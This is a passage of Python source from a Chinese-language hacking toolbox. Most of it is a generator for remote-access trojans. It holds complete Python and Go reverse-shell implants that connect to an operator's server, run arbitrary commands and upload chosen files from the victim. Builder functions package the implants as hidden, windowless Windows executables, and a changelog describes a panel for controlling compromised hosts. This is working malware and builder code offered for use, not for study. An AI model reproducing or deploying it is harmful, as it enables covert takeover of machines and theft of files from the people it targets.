    client.connect(("{listen_IP}", {listen_Port}))
except Exception:
    client.close()
    sys.exit(1)
tunnel_sockets = {{}}
transfer_state = {{
    'in_transfer': False,
    'file_handle': None,
    'file_size': 0,
    'sent_size': 0
}}
def aes_encrypt(plaintext: bytes, key: bytes) -> str:
    iv = os.urandom(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    result = base64.b64encode(iv + ciphertext).decode('utf-8')
    return result
def send_result(client_socket, result_bytes):
    data_length = len(result_bytes)
    length_prefix = aes_encrypt(str(data_length).encode('utf-8'), b'0123456789abcdef')
    client_socket.send(length_prefix.encode('utf-8'))
    client_socket.send(result_bytes)
def send_file_nonblocking(local_file):
    global transfer_state
    try:
        file_size = os.path.getsize(local_file)
        chunk_size = 8192
        client.sendall(str(file_size).encode("UTF-8"))
        ready, _, _ = select.select([client], [], [], 10.0)
        if not ready:
            return False, "服务器确认超时"
        ready = client.recv(1024).decode("UTF-8").strip()
        if ready != "READY":
            return False, f"服务器未准备好: {{ready}}"
        with open(local_file, 'rb') as f:
            sent_size = 0
            while sent_size < file_size:
                remaining = file_size - sent_size
                recv_size = min(chunk_size, remaining)
                chunk = f.read(recv_size)
                if not chunk:
                    break
                _, writable, _ = select.select([], [client], [], 5.0)
                if writable:
                    try:
                        client.sendall(chunk)
                        sent_size += len(chunk)
                    except socket.error as e:
                        return False, f"发送失败: {{e}}"
                else:
                    return False, "发送超时"
        return True, None
    except Exception as e:
        return False, str(e)
while True:
    try:
        readable, _, _ = select.select([client], [], [], 0.1)
        if not readable:
            continue
        response = client.recv(1024).decode('utf-8')

        if transfer_state['in_transfer']:
            continue
        if "exit" == response:
            break
        elif "cd" in response and response.startswith("cd "):
            os.chdir(response[3:].strip())
            result = "执行成功，结果为空".encode("UTF-8")
        elif "pwd" in response:
            result = os.getcwd().encode("UTF-8")
        elif "get_Process" in response:
            result = os.path.basename(__file__).encode("UTF-8")
        elif "start" in response and response.startswith("start "):
            subprocess.Popen(response, shell=True,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
            result = "执行成功，结果为空".encode("UTF-8")
        elif "get" in response and response.startswith("get "):
            try:
                parts = response.split(maxsplit=1)
                if len(parts) >= 2:
                    local_file = parts[1]
                    if os.path.exists(local_file):
                        transfer_state['in_transfer'] = True
                        success, error = send_file_nonblocking(local_file)
                        transfer_state['in_transfer'] = False
                        if success:
                            result = b''
                        else:
                            result = f"文件传输失败: {{error}}".encode("UTF-8")
                    else:
                        result = f"文件不存在: {{local_file}}".encode("UTF-8")
                else:
                    result = "命令格式错误，请使用: get <local_file>".encode("UTF-8")
            except Exception as e:
                transfer_state['in_transfer'] = False
                result = f"文件上传异常: {{str(e)}}".encode("UTF-8")
        else:
            result = subprocess.check_output(response,stderr=subprocess.STDOUT,shell=True)
        if result == b'':
            if "get" not in response:
                send_result(client, "执行成功，结果为空".encode("UTF-8"))
        else:
            send_result(client, result)
    except Exception as e:
        transfer_state['in_transfer'] = False
        send_result(client, "错误的命令输入！".encode("UTF-8"))
try:
    client.close()
except:
    pass
finally:
    sys.exit(0)"""
    elif language == "go":
        return f"""package main
import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)
var (
	tunnelSockets = make(map[net.Conn]bool)
	transferState = struct {{
		inTransfer  bool
		fileHandle  *os.File
		fileSize    int64
		sentSize    int64
	}}{{
		inTransfer: false,
	}}
)
func pkcs7Pad(data []byte, blockSize int) []byte {{
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{{byte(padding)}}, padding)
	return append(data, padText...)
}}

func aesEncrypt(plaintext []byte, key []byte) (string, error) {{
	block, err := aes.NewCipher(key)
	if err != nil {{
		return "", err
	}}
	iv := make([]byte, aes.BlockSize)
	for i := range iv {{
		iv[i] = byte(i)
	}}
	paddedData := pkcs7Pad(plaintext, aes.BlockSize)
	ciphertext := make([]byte, len(paddedData))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, paddedData)

	result := append(iv, ciphertext...)
	return base64.StdEncoding.EncodeToString(result), nil
}}
func sendResult(clientSocket net.Conn, result []byte) error {{
	dataLength := len(result)
	lengthPrefix, err := aesEncrypt([]byte(strconv.Itoa(dataLength)), []byte("0123456789abcdef"))
	if err != nil {{
		return err
	}}

	_, err = clientSocket.Write([]byte(lengthPrefix))
	if err != nil {{
		return err
	}}

	_, err = clientSocket.Write(result)
	return err
}}

func sendFileNonblocking(client net.Conn, localFile string) (bool, string) {{
	fileInfo, err := os.Stat(localFile)
	if err != nil {{
		return false, fmt.Sprintf("文件不存在: %s", localFile)
	}}

	fileSize := fileInfo.Size()
	chunkSize := 8192

	client.Write([]byte(strconv.FormatInt(fileSize, 10)))

	client.SetReadDeadline(time.Now().Add(10 * time.Second))
	buffer := make([]byte, 1024)
	n, err := client.Read(buffer)
	if err != nil {{
		return false, "服务器确认超时"
	}}

	ready := strings.TrimSpace(string(buffer[:n]))
	if ready != "READY" {{
		return false, fmt.Sprintf("服务器未准备好: %s", ready)
	}}

	client.SetReadDeadline(time.Time{{}})

	file, err := os.Open(localFile)
	if err != nil {{
		return false, fmt.Sprintf("无法打开文件: %v", err)
	}}
	defer file.Close()

	sentSize := int64(0)
	sendBuffer := make([]byte, chunkSize)

	for sentSize < fileSize {{
		remaining := fileSize - sentSize
		readSize := int64(chunkSize)
		if remaining < readSize {{
			readSize = remaining
		}}
		n, err := file.Read(sendBuffer[:readSize])
		if err != nil && err != io.EOF {{
			return false, fmt.Sprintf("读取文件失败: %v", err)
		}}

		if n == 0 {{
			break
		}}

		client.SetWriteDeadline(time.Now().Add(5 * time.Second))
		written, err := client.Write(sendBuffer[:n])
		if err != nil {{
			return false, fmt.Sprintf("发送失败: %v", err)
		}}

		client.SetWriteDeadline(time.Time{{}})
		sentSize += int64(written)
	}}

	return true, ""
}}
func executeCommand(cmdStr string) ([]byte, error) {{
	parts := strings.Fields(cmdStr)
	if len(parts) == 0 {{
		return nil, fmt.Errorf("空命令")
	}}
	var cmd *exec.Cmd
	if len(parts) > 1 {{
		cmd = exec.Command(parts[0], parts[1:]...)
	}} else {{
		cmd = exec.Command(parts[0])
	}}
	cmd = exec.Command(cmdStr)
	output, err := cmd.CombinedOutput()
	if err != nil {{
	    cmd = exec.Command("cmd", "/c", cmdStr)
	    output, err = cmd.CombinedOutput()
        return output, err
    }}
	return output, err
}}
func main() {{
	conn, err := net.Dial("tcp", "{listen_IP}:{listen_Port}")
	if err != nil {{
		fmt.Fprintf(os.Stderr, "连接失败: %v", err)
		os.Exit(1)
	}}
	defer conn.Close()
	fmt.Println("已连接到服务器")
	buffer := make([]byte, 4096)

	for {{
		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		n, err := conn.Read(buffer)

		if err != nil {{
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {{
				continue
			}}
			break
		}}
		conn.SetReadDeadline(time.Time{{}})
		if transferState.inTransfer {{
			continue
		}}
		response := strings.TrimSpace(string(buffer[:n]))
		var result []byte
		switch {{
		case response == "exit":
			return
		case strings.HasPrefix(response, "cd "):
			dir := strings.TrimSpace(response[3:])
			err := os.Chdir(dir)
			if err != nil {{
				result = []byte(fmt.Sprintf("切换目录失败: %v", err))
			}} else {{
				result = []byte("执行成功，结果为空")
			}}
		case response == "pwd":
			dir, err := os.Getwd()
			if err != nil {{
				result = []byte(fmt.Sprintf("获取当前目录失败: %v", err))
			}} else {{
				result = []byte(dir)
			}}
		case response == "get_Process":
			result = []byte(filepath.Base(os.Args[0]))
		case strings.HasPrefix(response, "start "):
			cmd := strings.TrimSpace(response[6:])
			parts := strings.Fields(cmd)
			if len(parts) > 0 {{
				exec.Command(parts[0], parts[1:]...).Start()
			}}
			result = []byte("执行成功，结果为空")
		case strings.HasPrefix(response, "get "):
			parts := strings.SplitN(response, " ", 2)
			if len(parts) >= 2 {{
				localFile := strings.TrimSpace(parts[1])
				if _, err := os.Stat(localFile); err == nil {{
					transferState.inTransfer = true
					success, errMsg := sendFileNonblocking(conn, localFile)
					transferState.inTransfer = false
					if success {{
						result = []byte{{}}
					}} else {{
						result = []byte(fmt.Sprintf("文件传输失败: %s", errMsg))
					}}
				}} else {{
					result = []byte(fmt.Sprintf("文件不存在: %s", localFile))
				}}
			}} else {{
				result = []byte("命令格式错误，请使用: get <文件路径>")
			}}
		default:
			output, err := executeCommand(response)
			if err != nil {{
				result = []byte(fmt.Sprintf("命令执行失败: %v", err))
			}} else if len(output) == 0 {{
				result = []byte("执行成功，结果为空")
			}} else {{
				result = output
			}}
		}}
		if len(result) > 0 || !strings.HasPrefix(response, "get ") {{
			err := sendResult(conn, result)
			if err != nil {{
				fmt.Fprintf(os.Stderr, "发送结果失败: %v", err)
				break
			}}
		}}
	}}
	fmt.Println("连接已关闭")
}}
"""

# 5、增加py木马，也就是生成木马操作
def add_py_muma():
    def create_and_save_text_file(content):
        # 弹出文件保存对话框，让用户选择保存位置和文件名
        filepath = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[("Python Files", "*.py"), ("All Files", "*.*")]
        )

        # 如果用户取消了操作，filepath会是空字符串
        if not filepath:
            print("文件保存被取消。")
            return

        # 写入内容到文件
        with open(filepath, 'w', encoding='utf-8') as file:
            file.write(content)
        messagebox.showinfo("生成成功",f"文件已保存到: {filepath}\n1、可以对py木马进行装饰\n\n3、打包为无窗口的后台运行：pyinstaller --onefile --noconsole -F --icon=NONE 1.py")

    if config_server_json_null_check():
        server_json = get_server_json()
        listen_IP = server_json["server_ip"]
        listen_Port = server_json["server_port"]

    else:
        messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
        return

    conntext = get_rouji_C(listen_IP, listen_Port, "python")

    create_and_save_text_file(conntext)

# 6、增加exe木马导出
def add_py_exe_muma():
    if config_server_json_null_check():
        server_json = get_server_json()
        listen_IP = server_json["server_ip"]
        listen_Port = server_json["server_port"]
    else:
        print("错误: 请先进行服务端的连接")
        return

    py_data = get_rouji_C(listen_IP, listen_Port, "python")

    filepath = filedialog.asksaveasfilename(
        defaultextension=".exe",
        filetypes=[("Executable Files", "*.exe"), ("All Files", "*.*")]
    )

    if not filepath:
        print("文件保存被取消")
        return

    output_dir = os.path.dirname(filepath)
    exe_name = os.path.splitext(os.path.basename(filepath))[0]
    # console = messagebox.askyesno("控制台选项", "是否显示控制台窗口？")
    console = True


    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write(py_data)
            temp_py = f.name

        # 创建更详细的批处理文件
        bat_content = f'''@echo off
title PyInstaller 编译工具 - {exe_name}
color 0A

echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║                  木马程序编译工具                        ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo [信息] 开始编译配置:
echo.
echo    源文件: {temp_py}
echo    输出目录: {output_dir}
echo    EXE名称: {exe_name}.exe
echo    控制台: {"隐藏 (后台运行)" if not console else "显示 (调试模式)"}
echo.
echo [信息] 正在编译，请耐心等待...
echo.

set START_TIME=%time%

pyinstaller --onefile --noconsole -F --icon=NONE --name="{exe_name}" --distpath="{output_dir}" "{temp_py}"

set END_TIME=%time%

echo.
echo ╔══════════════════════════════════════════════════════════╗
if exist "{output_dir}\\{exe_name}.exe" (
    echo ║                      编译成功！                        ║
    echo ╚══════════════════════════════════════════════════════════╝
    echo.
    echo [结果] EXE文件信息:
    echo.
    echo    位置: {output_dir}\\{exe_name}.exe
    for %%F in ("{output_dir}\\{exe_name}.exe") do (
        echo    大小: %%~zF 字节
    )
    echo    开始时间: %START_TIME%
    echo    结束时间: %END_TIME%
    echo.
    echo [提示] 文件已生成，可以直接使用
) else (
    echo ║                      编译失败！                        ║
    echo ╚══════════════════════════════════════════════════════════╝
    echo.
    echo [错误] 请检查上方错误信息
    echo.
    echo [建议] 常见问题:
    echo    1. 是否已安装pyinstaller: pip install pyinstaller
    echo    2. 是否以管理员权限运行
    echo    3. 磁盘空间是否充足
)
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║  按任意键关闭此窗口，或等待10秒后自动关闭...              ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

REM 等待10秒或按键
timeout /t 10 /nobreak >nul 2>nul

REM 清理临时文件
del /f /q "{temp_py}" 2>nul
rmdir /s /q "build" 2>nul
del /f /q "{exe_name}.spec" 2>nul
del /f /q "compile_{exe_name}.bat" 2>nul
exit
'''

        # 保存批处理文件
        bat_path = os.path.join(output_dir, f"compile_{exe_name}.bat")
        with open(bat_path, 'w', encoding='gbk') as f:
            f.write(bat_content)

        # 弹出新的CMD窗口
        subprocess.Popen(
            f'start cmd /c "{bat_path}"',
            shell=True
        )

    except Exception as e:
        print(f"错误: {str(e)}")
        messagebox.showerror("失败", f"错误: {str(e)}")

# 7、生成Go木马
def add_go_muma():
    def create_and_save_text_file(content):
        # 弹出文件保存对话框，让用户选择保存位置和文件名
        filepath = filedialog.asksaveasfilename(
            defaultextension=".go",
            filetypes=[("Go Files", "*.go"), ("All Files", "*.*")]
        )

        # 如果用户取消了操作，filepath会是空字符串
        if not filepath:
            print("文件保存被取消。")
            return

        # 写入内容到文件
        with open(filepath, 'w', encoding='utf-8') as file:
            file.write(content)
        messagebox.showinfo("生成成功",f"文件已保存到: {filepath}\n1、可以对go木马进行装饰\n\n3、打包为无窗口的后台运行：go build -ldflags=\"-H=windowsgui\" -o myprogram.exe main.go")

    if config_server_json_null_check():
        server_json = get_server_json()
        listen_IP = server_json["server_ip"]
        listen_Port = server_json["server_port"]

    else:
        messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
        return

    conntext = get_rouji_C(listen_IP, listen_Port, "go")

    create_and_save_text_file(conntext)

def add_go_exe_muma():
    # import os
    # import subprocess
    # import tempfile
    # from tkinter import filedialog, messagebox

    # 检查服务端连接（假设有此函数）
    if config_server_json_null_check():
        server_json = get_server_json()
        listen_IP = server_json["server_ip"]
        listen_Port = server_json["server_port"]
    else:
        print("错误: 请先进行服务端的连接")
        return

    go_data = get_rouji_C(listen_IP, listen_Port, "go")

    filepath = filedialog.asksaveasfilename(
        defaultextension=".exe",
        filetypes=[("Executable Files", "*.exe"), ("All Files", "*.*")]
    )

    if not filepath:
        print("文件保存被取消")
        return

    output_dir = os.path.dirname(filepath)
    exe_name = os.path.splitext(os.path.basename(filepath))[0]
    console = True  # 控制台选项，可以根据需要修改

    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.go', delete=False, encoding='utf-8') as f:
            f.write(go_data)
            temp_go = f.name

        # 创建更详细的批处理文件
        bat_content = f'''@echo off
title Go编译工具 - {exe_name}
color 0A

echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║                   Go 程序编译工具                      ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo [信息] 开始编译配置:
echo.
echo    源文件: {temp_go}
echo    输出目录: {output_dir}
echo    EXE名称: {exe_name}.exe
echo    控制台: {"隐藏 (后台运行)" if not console else "显示 (调试模式)"}
echo.
echo [信息] 正在编译，请耐心等待...
echo.

set START_TIME=%time%

go build -ldflags="-H=windowsgui" -o "{os.path.join(output_dir, exe_name + '.exe')}" "{temp_go}"

set END_TIME=%time%

echo.
echo ╔══════════════════════════════════════════════════════════╗
if exist "{os.path.join(output_dir, exe_name + '.exe')}" (
    echo ║                      编译成功！                        ║
    echo ╚══════════════════════════════════════════════════════════╝
    echo.
    echo [结果] EXE文件信息:
    echo.
    echo    位置: {os.path.join(output_dir, exe_name + '.exe')}
    for %%F in ("{os.path.join(output_dir, exe_name + '.exe')}") do (
        echo    大小: %%~zF 字节
    )
    echo    开始时间: %START_TIME%
    echo    结束时间: %END_TIME%
    echo.
    echo [提示] 文件已生成，可以直接使用
) else (
    echo ║                      编译失败！                        ║
    echo ╚══════════════════════════════════════════════════════════╝
    echo.
    echo [错误] 请检查上方错误信息
    echo.
    echo [建议] 常见问题:
    echo    1. 是否已安装Go: 请访问 https://golang.org/dl/
    echo    2. 是否以管理员权限运行
    echo    3. 磁盘空间是否充足
)
echo.
echo ╔══════════════════════════════════════════════════════════╗
echo ║  按任意键关闭此窗口，或等待10秒后自动关闭...              ║
echo ╚══════════════════════════════════════════════════════════╝
echo.

REM 等待10秒或按键
timeout /t 10 /nobreak >nul 2>nul

REM 清理临时文件
del /f /q "{temp_go}" 2>nul
exit
'''

        # 保存批处理文件
        bat_path = os.path.join(output_dir, f"compile_{exe_name}.bat")
        with open(bat_path, 'w', encoding='gbk') as f:
            f.write(bat_content)

        # 弹出新的CMD窗口
        subprocess.Popen(
            f'start cmd /c "{bat_path}"',
            shell=True
        )

    except Exception as e:
        print(f"错误: {str(e)}")
        messagebox.showerror("失败", f"错误: {str(e)}")


### 九、其他的相关操作
# 1、判断操作系统。True为windows
def os_name():
    return os.name == 'nt'

# 2、获取脚本当前所处的系统目录
def get_os_path():
    # 获取脚本当前的绝对路径
    current_file_path = os.path.abspath(__file__)   # 当前所在的文件
    return os.path.dirname(current_file_path)  # 当前所在的文件夹路径

# 3、创建文件夹
def create_dir(path):
    if not os.path.exists(path):
        try:
            # 如果文件夹不存在，尝试创建它
            os.mkdir(path)
            print(f"文件夹 '{path}' 创建成功。")
        except OSError as error:
            # 处理创建文件夹时可能出现的异常
            print(f"创建文件夹时出错: {error}")
    else:
        print(f"文件夹 '{path}' 已存在。或正在下载，请等待下载成功！")

# 4、删除文件夹
def delete_dir(menu_path,tool_path):
    # 如果是 链接 或者是 绝对路径
    if "http" in tool_path:
        pass
    else:
        os_path = get_os_path()
        # 获取相对路径的第一个文件夹
        tool_dir = tool_path.split('\\')[0]
        folder_to_delete = os_path + "\\" + menu_path + "\\" + tool_dir

        # 检查是否存在该目录
        if os.path.exists(folder_to_delete):
            # 删除整个文件夹及其内容
            shutil.rmtree(folder_to_delete)
            print(f"已删除文件夹及其所有内容: {folder_to_delete}")
        else:
            print(f"文件夹不存在: {folder_to_delete}")

# 5、判断工具是绝对路径、相对路径还是链接
#       1：绝对路径 2：相对路径 3：下载链接 4、链接打开
def is_path(tool):
    def path_check(tool_path):
        if get_menu_path_one(tool["工具分类"]) in tool_path:
            return 1    # 返回绝对路径
        else:
            tool_dir = tool_path.split('\\')[0]
            if os.path.exists(get_os_path() + "\\" + get_menu_path_one(tool["工具分类"]) + "\\" + tool_dir):
                return 2    # 返回相对路径
            else:
                return 1    # 返回绝对路径

    if tool["启动方式"] == "下载链接":
        if len(tool["工具命令"]) == 0:
            return 3    # 返回链接
        else:
            return path_check(tool["工具命令"])
    if tool["启动方式"] == "链接打开":
        return 4

    return path_check(tool["工具路径"])

# 6、判断一个获取的json格式是否为空
# 如果为空，则返回False，否则有东西返回True
def check_json_null(jsonInfo):
    if len(jsonInfo) == 0 or jsonInfo == {}:
        return False
    return True

### 十、更新记录
def get_update_record_content():
    return {
        "v1.2.0":
"""
1、完美解决【肉鸡面板】文件传输功能
2、增加【肉鸡面板】GO语言支持
""",
        "v1.1.9":
"""
1、增加工具属性展示功能
2、优化【肉鸡面板】文件传输功能
3、目录【肉鸡面板】在文件传输时rouji_json_xinxi请求会导致A端与S端通讯出错
""",
        "v1.1.8":
"""
1、全面修复【肉鸡面板】的bug
2、增加py导出和exe导出功能
""",
        "v1.1.7":
"""
1、完善【肉鸡面板】的文件上传功能
2、优化【肉鸡面板】界面和部分bug
""",
        "v1.1.6":
"""
1、完善【肉鸡面板】的命令行基本功能
2、优化【肉鸡面板】界面和部分bug
""",
        "v1.1.5":
"""
1、优化json格式化'单引号出错的问题
""",
        "v1.1.4":
"""
1、修改全局ctrl+A选择背景颜色
2、修正【临时笔记】ctrl+z回退两次bug
""",
        "v1.1.3":
"""
1、修改【更新记录】的展示位置
2、增加MD5编码功能
""",
        "v1.1.2":
"""
1、全面升级【临时笔记】面板
""",
        "v1.1.1":
"""
1、增加了【更新记录】面板
2、优化了【编解码】面板的按钮位置
"""
    }